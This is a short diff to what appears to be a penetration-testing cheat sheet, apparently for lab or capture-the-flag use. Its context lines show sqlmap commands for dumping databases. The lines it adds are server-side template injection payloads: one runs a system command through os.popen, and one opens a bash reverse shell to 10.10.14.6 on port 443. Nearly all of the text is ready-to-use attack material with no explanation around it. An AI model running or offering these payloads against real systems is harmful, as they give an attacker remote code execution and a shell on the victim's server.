@@ -65,3 +65,11 @@ SQLMap Commands:
 sqlmap -r sqlfile –dbs --batch
 sqlmap -r sqlfile -D <database_name> –dbs --batch
 
+*******************************************************************************************************************************
+
+SSTI Payloads:
+
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}
+
+
